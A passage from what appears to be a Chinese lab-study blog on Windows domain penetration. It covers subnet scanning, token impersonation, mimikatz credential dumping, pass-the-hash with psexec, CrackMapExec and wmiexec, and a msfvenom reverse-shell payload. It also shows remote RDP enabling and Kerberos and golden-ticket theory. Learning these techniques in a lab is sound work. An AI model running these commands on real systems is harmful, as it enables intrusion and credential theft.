"Detailed" 192.168.1.$ip}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220313144732755.png" alt="image-20220313144732755"></p><p>针对某 IP 段 &amp; 多个端口的扫描器</p><pre class="line-numbers language-none"><code class="language-none">1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2&gt;$null}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>msf内网主机检测</strong></p><p>模块</p><pre class="line-numbers language-none"><code class="language-none">主机存活探测：auxiliary/scanner/discovery/arp_sweep ARP 扫描auxiliary/scanner/discovery/udp_sweep UDP 扫描auxiliary/scanner/netbios/nbname NETBIOS 扫描auxiliary/scanner/snmp/snmp_enum SNMP 扫描auxiliary/scanner/smb/smb_version SMB 扫描端口扫描：auxiliary/scanner/portscan/ack TCP ACK 端口扫描auxiliary/scanner/portscan/ftpbounce FTP bounce 端口扫描auxiliary/scanner/portscan/syn SYN 端口扫描auxiliary/scanner/portscan/tcp TCP 端口扫描auxiliary/scanner/portscan/xmas TCP XMas 端口扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>nmap</strong></p><p>一个端口扫描器，可用于主机发现、端口扫描、版本检测、OS 检测等。</p><p>使用场景：建立 socks 代理，proxychains+Nmap 扫描内网。</p><p>支持多种扫描模式：</p><ul><li>-sT: TCP 扫描</li><li>-sS: SYN 扫描</li><li>-sA: ACK 扫描</li><li>-sF：FIN 扫描</li><li>-sU: UDP 扫描</li><li>-sR: RPC 扫描</li><li>-sP: ICMP 扫描</li></ul><p>快速扫描所有端口：</p><p>半开放扫描</p><pre class="line-numbers language-none"><code class="language-none">nmap -sS -p 1-65535 -v 192.168.0.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220313150057634.png" alt="image-20220313150057634"></p><h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><p>通过域成员主机定位处域控IP，利用域管理员可登录域中任何成员主机，定位出域管理员登陆过的IP，想办法从域成员主机中dump处域管理员密码，拿下域控，进而渗透整个内网</p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>令牌(token)是<strong>系统的临时秘钥，相当于账号和密码</strong>，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。</p><p>它允许你在<strong>不提供密码或其他凭证的前提下，访问网络和系统资源</strong>，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p><p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</p><p>令牌有很多种：</p><ul><li>访问令牌(Access Token)：表示访问控制操作主体的系统对象</li><li>会话令牌(Session Token)：是交互会话中唯一的身份标识符</li><li>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如 U 盾</li></ul><p>Windows的AccessToken有两种类型：</p><ul><li>Delegation Token：授权令牌，它支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问) </li><li>Impresonation Token：模拟令牌，它是非交互的会话 (例如使用 net use访问共享文件夹)。</li></ul><blockquote><p>两种 token 只在系统重启后清除，具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation token，依旧有效。</p></blockquote><h3 id="access-token-的窃取和利用"><a href="#access-token-的窃取和利用" class="headerlink" title="access token 的窃取和利用"></a>access token 的窃取和利用</h3><p><strong>AccessToken 的窃取与利用需要administrator管理员权限。也就是说要提权。</strong></p><p>窃取 AccessToken 的方法：</p><ul><li>incognito.exe 程序 </li><li>InvokeTokenManipulat.ps1 脚本 </li><li>MSF 里的 incognito 模块</li></ul><h4 id="incognito"><a href="#incognito" class="headerlink" title="incognito"></a>incognito</h4><p><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p><p><strong>access token 列举 (需要administrator权限)</strong></p><pre class="line-numbers language-none"><code class="language-none">incognito.exe list_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220313171504639.png" alt="image-20220313171504639"></p><p>模拟其他用户</p><pre class="line-numbers language-none"><code class="language-none">incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220313171958360.png" alt="image-20220313171958360"></p><p>exit退出到之前的access token</p><p><img src="/2022/03/09/day40/image-20220313172118849.png" alt="image-20220313172118849"></p><h4 id="msf下的incognito"><a href="#msf下的incognito" class="headerlink" title="msf下的incognito"></a>msf下的incognito</h4><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.80.134 -f exe -o msf.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到meterpreter</p><pre class="line-numbers language-none"><code class="language-none">use incognito #加载 incognitolist_tokens -u #列出 AccessTokenimpersonate_token 12SERVER-01\Administrator #假冒 12server-01\adminstrator 的令牌impersonate_token moonsec\\test #假冒 moonsec\test的令牌impersonate_token "NT AUTHORITY\SYSTEM" #假冒 System 的令牌<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了可伪造令牌，也可从进程里窃取令牌</p><p>首先使用 ps 命令列出进程，查看进程</p><p>用户使用 steal_token pid 窃取令牌就有对应的权限。</p><pre class="line-numbers language-none"><code class="language-none">rev2self 返回之前的token<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220313182025509.png" alt="image-20220313182025509"></p><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="PTH-pass-the-hash-hash传递"><a href="#PTH-pass-the-hash-hash传递" class="headerlink" title="PTH(pass-the-hash)hash传递"></a>PTH(pass-the-hash)hash传递</h3><p>pass-the-hash 在内网渗透中是一种很经典的攻击方式，原理通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p><p>pass the hash 原理：</p><ul><li><p>在 Windows 系统中，通常会使用 NTLM 身份认证</p></li><li><p>NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成(例如 LsaLogonUser)</p></li><li><p>hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LMhash。</p><p>从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LMhash</p></li><li><p>如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户(即跳过调用API 生成 hash 的过程)</p></li></ul><p>此攻击适用于：</p><ul><li>域/工作组环境</li><li>可以获得 hash，但是条件不允许对 hash 爆破</li><li>内网中存在和当前机器相同的密码</li></ul><p>打了补丁后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator(SID 500)账号例外</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>它能从 lsass.exe进程中获取windows的账号及明文密码</p><p>需要在同一个ip段下</p><p>目标机</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords或者把hash导出到passwordmimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"&gt; password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本机</p><p>得到hash后执行</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth /user:administrator /domain:workgroup /ntlm:32ed87bdb5fdc5e9cba88547376818d4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220314134112525.png" alt="image-20220314134112525"></p><p>可看到不需要账号密码即可列出12server1的c盘</p><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>可在远程计算机上执行命令</p><p>原理通过管道在远程目标主机上创建一个psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过psexec 服务运行命令，运行结束后删除服务</p><p><strong>利用 SMB 服务远程执行</strong></p><p>可以通过明文或 hash 传递</p><p>条件 445 服务端口开放</p><p>在使用 PsExec 时需要注意以下几点：</p><ul><li>需要远程系统开启 admin$ 共享（默认是开启的）</li><li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li><li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li><li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li><li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是administrator 权限的 shell </li><li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</li></ul><p>使用明文密码登录</p><pre class="line-numbers language-none"><code class="language-none">psexec /accepteula /s \\192.168.0.137 -u Administrator -p 123456 cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220314144339911.png" alt="image-20220314144339911"></p><p>或者使用hash登录</p><pre class="line-numbers language-none"><code class="language-none">psexec -hashes aaa:32ed87bdb5fdc5e9cba88547376818d4 ./Administrator@192.168.0.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220314144727662.png" alt="image-20220314144727662"></p><p>建立ip$，之后通过psexec直接连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.0.137\ipc$ "123456" /user:administratorpsexec /accepteula /s \\192.168.0.137 cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220314145818697.png" alt="image-20220314145818697"></p><p>尝试登录域控，需要输入密码</p><pre class="line-numbers language-none"><code class="language-none">psexec moonsec/Administrator@192.168.0.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220314150257402.png" alt="image-20220314150257402"></p><h3 id="msf-hash"><a href="#msf-hash" class="headerlink" title="msf hash"></a>msf hash</h3><p>同ip段下</p><p>拿到一个meterperter，在此处执行</p><p>如果不能执行可尝试迁移到其他进程下</p><pre class="line-numbers language-none"><code class="language-none">hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220314154922022.png" alt="image-20220314154922022"></p><p>使用psexec登录</p><pre class="line-numbers language-none"><code class="language-none">use exploit/windows/smb/psexecset SMBUser Administratorset rhosts 192.168.0.137set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220314155200373.png" alt="image-20220314155200373"></p><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><p><a href="https://github.com/byt3bl33d3r/CrackMapExec.git">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p><p>在kali中安装下</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install CrackMapExec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对192.168.0.0/24的C段进行批量pass the hash</p><pre class="line-numbers language-none"><code class="language-none">crackmapexec smb 192.168.0.0/24 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220314184026925.png" alt="image-20220314184026925"></p><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。</p><p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p><h4 id="wmic命令"><a href="#wmic命令" class="headerlink" title="wmic命令"></a>wmic命令</h4><p><strong>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存</strong></p><blockquote><p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口</p><p>( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445 端⼝传回显)</p></blockquote><pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.0.137 /user:administrator /password:123456 process call create "cmd.exe /c ipconfig &gt; c:\ip.txt"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220319131515674.png" alt="image-20220319131515674"></p><p>在靶机上可看到执行成功</p><p><img src="/2022/03/09/day40/image-20220319131538666.png" alt="image-20220319131538666"></p><p>这里我们可以建立IPC$，用type来读取结果</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.0.137\ipc$ "123456" /user:administratortype \\192.168.0.137\c$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220319132339259.png" alt="image-20220319132339259"></p><p><strong>使用 wmic 远程开启目标的 RDP(3389)</strong></p><pre class="line-numbers language-none"><code class="language-none">适于 Windows xp、server 2003wmic /node:192.168.0.137 /user:administrator /password:123456 PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostnamewmic /node:192.168.0.137 /user:administrator /password:123456 RDTOGGLE WHERE ServerName='计算机名' call SetAllowTSConnections 1或者wmic /node:192.168.0.123 /user:administrator /password:123456 process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220319134812454.png" alt="image-20220319134812454"></p><p>可在靶机上看到开启了3389</p><p><img src="/2022/03/09/day40/image-20220319134835123.png" alt="image-20220319134835123"></p><p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p><pre class="line-numbers language-none"><code class="language-none">REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>远程重启</strong></p><pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.0.137 /user:administrator /password:123456 process call create "shutdown.exe -r -f -t 0"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220319135043352.png" alt="image-20220319135043352"></p><h4 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h4><p>可用来直接获取 shell</p><p>我们这里简单的对PTH做下实验</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 Administrator@192.168.0.137 "whoami"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>wmiexec.py 的 hash 参数格式为 LM Hash:NT Hash，00000000000000000000000000000000 这个部分可以随便填写</p><p><img src="/2022/03/09/day40/image-20220319132829286.png" alt="image-20220319132829286"></p><p>用wmiexec.py明文获取shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:123456@192.168.0.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220319132950974.png" alt="image-20220319132950974"></p><h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能</p><p>wmiexec.vbs 下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p><p><strong>拿到一个交互式shell</strong></p><pre class="line-numbers language-none"><code class="language-none">cscript //nologo wmiexec.vbs /shell 192.168.0.137 administrator 123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220319135349857.png" alt="image-20220319135349857"></p><p><strong>使用 vmiexec.vbs 执行单条命令</strong></p><pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs /cmd 192.168.0.137 administrator 123456 "ipconfig"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220319135528570.png" alt="image-20220319135528570"></p><h4 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h4><p>poweshell脚本</p><p>利用Powershell 调用 WMI 来远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">在 Powershell 中运行以下命令\# 导入 Invoke-WmiCommand.ps1 脚本Import-Module .\Invoke-WmiCommand.ps1\# 指定目标系统用户名$User = ".\administrator"\# 指定目标系统的密码$Password = ConvertTo-SecureString -String "123456" -AsPlainText -Force\# 将账号和密码整合起来，以便导入 Credential$Cred = New-Object -TypeName System.Management.Automation.PSCredential-ArgumentList $User,$Password\# 指定要执行的命令和目标 IP$Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.0.137\# 将执行结果输出到屏幕上$Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220319140308222.png" alt="image-20220319140308222"></p><h4 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h4><p>PowerShell 自带的一个模块，它来连接远程计算机执行命令和指定程序</p><pre class="line-numbers language-none"><code class="language-none">指定目标系统用户名$User=".\administrator"指定目标系统密码$Password=ConvertTo-SecureString -String "123456" -AsPlainText -Force将账号和密码整合起来，以便导入 Credential 中$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password在远程系统中运行 calc.exe 命令Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.0.137" -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后再靶机任务管理器上，可看到计算机的程序</p><h3 id="PTT-票据传递攻击-Pass-the-Ticket"><a href="#PTT-票据传递攻击-Pass-the-Ticket" class="headerlink" title="PTT 票据传递攻击(Pass the Ticket)"></a>PTT 票据传递攻击(Pass the Ticket)</h3><h4 id="kerberos协议"><a href="#kerberos协议" class="headerlink" title="kerberos协议"></a>kerberos协议</h4><p>Kerberos 协议是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。</p><p>其设计目标是<strong>通过密钥系统为客户机与服务器应用程序提供强大的认证服务</strong>。该协议的认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</p><p>Kerberos 协议在在内网域渗透领域中至关重要，白银票据、黄金票据、攻击域控等都离不开 Kerberos 协议。</p><table><thead><tr><th>角色</th><th>作用</th></tr></thead><tbody><tr><td>Domain Controller</td><td>域控制器，简称 DC，一台计算机，实现用户、计算机的统一管理</td></tr><tr><td>Key Distribution Center</td><td>秘钥分发中心，简称 KDC，默认安装在域控里，包括 AS 和 TGS</td></tr><tr><td>Authentication Service</td><td>身份验证服务，简称 AS，用于 KDC 对 Client 认证</td></tr><tr><td>Ticket Granting Service</td><td>票据授予服务，简称 TGS，用于KDC 向 Client 和 Server 分发Session Key(临时秘钥)</td></tr><tr><td>Active Directory</td><td>活动目录，简称 AD，用于存储用户、用户组、域相关的信息</td></tr><tr><td>Client</td><td>客户端，指用户</td></tr><tr><td>Server</td><td>服务端，可能是某台计算机，也可能是某个服务</td></tr></tbody></table><p><img src="/2022/03/09/day40/image-20220319150901790.png" alt="image-20220319150901790"></p><h4 id="kerberos认证原理"><a href="#kerberos认证原理" class="headerlink" title="kerberos认证原理"></a>kerberos认证原理</h4><p>大致整个认证过程</p><p><img src="/2022/03/09/day40/image-20220319151136017.png" alt="image-20220319151136017"></p><ol><li><p>首先 Client 向域控制器 DC 请求访问 Server，DC 通过去 AD 活动目录中查找依次区分 Client 来判断 Client 是否可信。</p></li><li><p>可信的话返回 TGT 给 Client，Client 得到 TGT（Ticket Granting Ticket）。</p></li><li><p>Client 继续拿着 TGT 请求 DC 访问 Server，TGS 通过 Client 消息中的 TGT，判断 Client 是否有访问权限。</p></li><li><p>有的话则给 Client 有访问 Server 的权限 Ticket，也叫 ST（Service Ticket）。</p></li><li><p>Client 得到 Ticket 后，再去访问 Server，最终client与server建立通信。</p><p>该 Ticket 只针对这一个 Server有效。</p></li></ol><p>详细认证步骤：</p><ul><li>AS<em>REQ &amp; AS</em>REP</li><li>TGS<em>REQ &amp; TGS</em>REP</li><li>AP-REQ &amp; AP-REP</li></ul><h5 id="ASREQ-amp-ASREP"><a href="#ASREQ-amp-ASREP" class="headerlink" title="ASREQ &amp; ASREP"></a><strong>ASREQ &amp; ASREP</strong></h5><p>该阶段是 Client 和 AS 的认证，通过认证的客户端将获得 TGT </p><p><img src="/2022/03/09/day40/image-20220319152155657.png" alt="image-20220319152155657"></p><p>当域内某个客户端用户 Client 试图访问域内的某个服务，于是输入用户名和密码，此时客户端本机的 Kerberos 服务会向 KDC 的 AS 认证服务发送一个 AS_REQ 认证请求。请求的凭据是 Client 的哈希值 NTLM-Hash 加密的时间戳以及 Client-info、Server-info 等数据，以及一些其他信息。</p><p>当 AS接收到client发送的身份信息后，AS 会先向活动目录 AD 请求，询问是否有此Client 用户，如果有的话，就会取出它的 NTLM-Hash，并对 AS_REQ 请求中加密的时间戳进行解密，如果解密成功，则证明客户端提供的密码正确，如果时间戳在五分钟之内，则预认证成功。然后 AS 会生成一个临时秘钥 Session-Key AS，并使用客户端 Client 的 NTLM-Hash 加密 Session-key AS 作为响应包的一部分内容。此Session-key AS 用于确保客户端和 KGS 之间的通信安全。</p><p>还有一部分内容就是 TGT：使用 KDC 一个特定账户的 NTLM-Hash 对 Session-keyAS、时间戳、Client-info 进行的加密。这个特定账户就是创建域控时自动生成的Krbtgt 用户，然后将这两部分以及 PAC 等信息回复给 Client，即 AS_REP。PAC 中包含的是用户的 SID、用户所在的组等一些信息。</p><blockquote><p>AS-REP 中最核心的东西就是 Session-key 和 TGT。我们平时用Mimikatz、kekeo、rubeus 等工具生成的凭据是 .kirbi 后缀，Impacket 生成的凭据的后缀是 .ccache。这两种票据主要包含的都是 Session-key 和TGT，因此可以相互转化。</p></blockquote><p>到此，第一步认证结束</p><h5 id="TGSREQ-amp-TGSREP"><a href="#TGSREQ-amp-TGSREP" class="headerlink" title="TGSREQ &amp; TGSREP"></a><strong>TGSREQ &amp; TGSREP</strong></h5><p>该阶段是 Client 和 TGS 的认证，通过认证的客户端将获得 ST 服务票据</p><p><img src="/2022/03/09/day40/image-20220319152222349.png" alt="image-20220319152222349"></p><p>客户端 Client 收到 AS 的回复 AS_REP 后分别获得了 TGT 和加密的 Session-KeyAS。它会先用自己的 Client NTLM-hash 解密得到原始的 Session-Key AS，然后它会在本地缓存此 TGT 和原始的 Session-Key AS，如果现在它就需要访问某台服务器上的服务，他就需要凭借这张 TGT 认购凭证向 KGS 购买相应的 ST 服务票据（也叫Ticket）。</p><p>此时 Client 会使用 Session-Key AS 加密时间戳、Client-info、Server-info 等数据作为一部分。由于 TGT 是用 Krbtgt 账户的 NTLM-Hash 加密的，Client 无法解密，所以 Client 会将 TGT 作为另一部分继续发送给 TGS。两部分组成的请求被称为TGS_REQ。</p><p>TGS 收到该请求，用 Krbtgt 用户的 NTLM-hash 先解密 TGT 得到 Session-key AS、时间戳、Client-info 以及 Server-info。再用 Session-key AS 解密第一部分内容，得到 Client-info、时间戳。然后将两部分获取到时间戳进行比较，如果时间戳跟当前时间相差太久，就需要重新认证。TGS 还会将这个 Client 的信息与 TGT 中的 Client信息进行比较，如果两个相等的话，还会继续判断 Client 有没有权限访问 Server，如果都没有问题，认证成功。认证成功后，KGS 会生成一个 Session-key TGS，并用 Session-key AS 加密 Session-key TGS 作为响应的一部分。此 Session-key TGS 用于确保客户端和服务器之间的通信安全。</p><p>另一部分是使用服务器 Server 的 NTLM-Hash 加密 Session-key TGS、时间戳以及Client-info 等数据生成的 ST。然后 TGS 将这两部分信息回复给 Client，即TGS_REP。</p><p>至此，client和KDC的通信结束</p><h5 id="AP-REQ-amp-AP-REP"><a href="#AP-REQ-amp-AP-REP" class="headerlink" title="AP-REQ &amp; AP-REP"></a><strong>AP-REQ &amp; AP-REP</strong></h5><p>该阶段是client和server的认证，通过认证的客户端将与服务器建立连接</p><p><img src="/2022/03/09/day40/image-20220319152837792.png" alt="image-20220319152837792"></p><p>客户端 Client 收到 TGS_REP 后，分别获得了 ST 和加密的 Session-Key TGS。它会先使用本地缓存了的 Session-key AS 解密出了原始的 Session-key TGS。然后它会在本地缓存此 ST 和原始的 Session-Key TGS，当客户端需要访问某台服务器上的服务时会向服务器发送请求。它会使用 Session-key TGS 加密 Client-info、时间戳等信息作为一部分内容。ST 因为使用的是 Server NTLM-hash 进行的加密，无法解密，所以会原封不动发送给 Server。两部分一块发送给 Server，这个请求即是AP_REQ。</p><p>Server 收到 AP_REQ 请求后，用自身的 Server NTLM-Hash 解密了 ST，得到Session-Key TGS，再解密出 Client-info、时间戳等数据。然后与 ST 的 Client-info、时间戳等进行一一对比。时间戳有效时间一般时间为 8 小时。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL进行对比，最后决定是否给用户提供相关的服务。通过认证后 Server 将返回最终的 AP-REP </p><h5 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a><strong>PAC</strong></h5><p>PAC 是用来验证 Client 的访问权限，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS</p><p>我们在前面关于 Kerberos 认证流程的介绍中提到了 PAC（Privilege Attribute Certificate）这个东西，这是微软为了访问控制而引进的一个扩展，即特权访问证书。在上面的认证流程中，如果没有 PAC 的访问控制作用的话，只要用户的身份验证正确，那么就可以拿到 TGT，有了 TGT，就可以拿到 ST，有了 ST ，就可以访问服务了。此时任何一个经过身份验证的用户都可以访问任何服务。像这样的认证只解决了 “Who am i?” 的问题，而没有解决 “What can I do?” 的问题。</p><p>为了解决上面的这个问题，微软引进了 PAC。</p><p>即 KDC 向客户端 Client 返回 AS_REP时插入了 PAC，PAC 中包含的是用户的 SID、用户所在的组等一些信息。当最后服务端 Server 收到 Client 发来的 AP_REQ 请求后，首先会对客户端身份验证。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的ACL 进行对比，最后决定是否给用户提供相关的服务。</p><p>但是在有些服务中并没有验证 PAC 这一步，这也是白银票据能成功的前提，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC，PAC 当然也验证不成功。</p><h4 id="Kerberos认证中存在的安全问题"><a href="#Kerberos认证中存在的安全问题" class="headerlink" title="Kerberos认证中存在的安全问题"></a>Kerberos认证中存在的安全问题</h4><p>我们常说的 MS14-068、黄金票据、白银票据等就是基于 Kerberos 协议进行攻击。</p><h5 id="黄金票据-Golden-ticket"><a href="#黄金票据-Golden-ticket" class="headerlink" title="黄金票据(Golden ticket)"></a>黄金票据(Golden ticket)</h5><p>黄金票据在利用过程中由 KDC颁发 TGT，并且在生成伪造的 TGT 的 20 分钟内，TGS 不会对该 TGT 的真伪进行效验</p><p>在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC使用 Krbtgt 用户的 NTLM-Hash 作为密钥进行加密，生成 TGT。如果获取到了Krbtgt 的 NTLM-Hash 值，就可以伪造任意的 TGT 。因为 Krbtgt 只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</p><p>先假设这么一种情况，原先已拿到的域内所有的账户 Hash，包括 Krbtgt 这个账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置 Krbtgt 密码，基于此条件，我们还能利用该票据重新获得域管理员权限。</p><p>利用 Krbtgt 的 Hash 值可以伪造生成任意的 TGT，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于 Kerberos 认证的任何服务。</p><h5 id="白银票据-sliver-ticket"><a href="#白银票据-sliver-ticket" class="headerlink" title="白银票据(sliver 